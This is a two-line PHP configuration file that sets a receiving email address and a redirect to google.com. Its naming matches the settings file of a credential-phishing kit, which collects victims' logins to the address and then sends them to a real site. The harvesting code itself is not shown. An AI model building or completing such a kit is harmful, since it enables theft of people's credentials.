<?php 
$Receive_email="onlyonehomedesk@gmail.com";
$redirect="https://www.google.com/";
?>